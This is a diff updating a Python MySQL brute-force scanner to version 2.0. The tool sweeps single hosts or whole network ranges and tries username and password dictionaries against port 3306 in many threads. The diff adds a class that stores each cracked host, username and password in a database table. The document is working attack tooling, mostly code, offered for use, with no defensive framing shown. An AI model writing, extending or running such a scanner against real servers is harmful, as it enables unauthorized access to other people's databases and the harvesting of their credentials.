@@ -1,6 +1,5 @@
-
 """
-@ mysql扫描器  2019-06-21
+@ mysql扫描器 V2.0  2019-06-22
 """
 
 import pymysql
@@ -9,6 +8,32 @@ import queue
 import threading
 import getopt
 import sys
+import warnings
+warnings.filterwarnings("ignore")
+
+from config import *
+
+
+class LinkMysql(object):
+    def __init__(self):
+        self.link_mysql()
+
+    def link_mysql(self):
+        try:
+            self.conn = pymysql.connect(host=HOST, port=PORT, user=USER, password=PASSWORD, database=DATABASE)
+            self.cursor = self.conn.cursor()
+        except Exception as e:
+            print("\n数据库连接失败：%s\n请检查MYSQL配置！\n" % e)
+
+    def save_host(self, ip, user, pwd):
+        try:
+            sql = "INSERT IGNORE INTO %s" % TABLE + "(host, username, password) VALUES('%s', '%s', '%s')" % \
+                  (pymysql.escape_string(ip), user, pymysql.escape_string(pwd))
+            # sql = "INSERT IGNORE INTO %s" % TABLE + "(host, username, password) VALUES('%s', '%s', '%s')" % (ip, user, pymysql.escape_string("sa%asa"))
+            self.cursor.execute(sql)
+            self.conn.commit()
+        except Exception as e:
+            print("保存失败：", e)
 
 
 class MysqlScanner(object):
@@ -101,8 +126,9 @@ class MysqlScanner(object):
                 pymysql.connect(host=ip, user=username, passwd=password, port=self.port, connect_timeout=0.1)
                 self.lock.acquire()
                 print("----- Success connected. (IP: %s, User: %s, Pass: %s)" % (ip, username, password))
-                with open(self.outfile, 'a') as f:
-                    f.write(ip+":"+str(port) + "\t" + username + "\t" + password + "\n")
+                # with open(self.outfile, 'a') as f:
+                #     f.write(ip + ":" + str(port) + "\t" + username + "\t" + password + "\n")
+                mq.save_host(ip, username, password)
                 self.lock.release()
             except Exception as e:
                 if printall:
@@ -115,7 +141,7 @@ class MysqlScanner(object):
     def scanner(self, ip):
         t_wait = []
         for i in range(self.thread):
-            t = threading.Thread(target=self.connect, args=(ip, ))
+            t = threading.Thread(target=self.connect, args=(ip,))
             t_wait.append(t)
             t.setDaemon(True)
             t.start()
@@ -125,16 +151,6 @@ class MysqlScanner(object):
 
 
 if __name__ == '__main__':
-
-    ipcmd = "ip.txt"
-    port = 3306
-    usercmd = "user.txt"
-    passcmd = "pass.txt"
-
-    thread = 12
-    timeout = 1.0
-    savefile = "result.txt"
-    printall = 0
 
     opts, args = getopt.getopt(sys.argv[1:], "hH:u:p:P:T:t:s:a:")
     for opt, arg in opts:
@@ -146,18 +162,18 @@ if __name__ == '__main__':
  / /  / / /_/ (__  ) /_/ / /___/ / /__/ /_/ / / / / / / /  __/ /    
 /_/  /_/\__, /____/\__, /_//____/\___/\__,_/_/ /_/_/ /_/\___/_/     
        /____/        /_/    
-                                               
+
 \t -H\t 主机地址，有以下三种方式：
 \t \t 192.168.1.1   单个地址
 \t \t 192.168.1.1/16    掩码网段地址
 \t \t ip.txt    地址文件
-\t -u\t 用户文件或单个用户 [默认：user.txt] 
-\t -p\t 密码文件或单个密码 [默认：pass.txt] 
+\t -u\t 用户文件或单个用户 [默认：dic_username_mysql.txt] 
+\t -p\t 密码文件或单个密码 [默认：dic_password_mysql.txt] 
 \t -P\t 端口号 [默认：3306] 
 \t -T\t 线程数量 [默认：12] 
 \t -t\t 连接超时 [默认：1.0s] 
 \t -s\t 保存结果 [默认：result.txt] 
-\t -a\t 打印模式 [默认：0 不显示失败结果]
+\t -a\t 打印模式 [默认：1 显示失败结果]
 """)
             exit()
         elif opt == '-H':
@@ -177,10 +193,17 @@ if __name__ == '__main__':
         elif opt == '-a':
             printall = int(arg)
 
+    mq = LinkMysql()
+
     ms = MysqlScanner()
     ips = ms.getIpList(ipcmd)
     users = ms.getUserList(usercmd)
     pwds = ms.getPassList(passcmd)
+
+    user_pwds = []
+    for user in users:
+        for pwd in pwds:
+            user_pwds.append((user, pwd))
 
     for ip in ips:
         ms.prepareQueue(users, pwds)
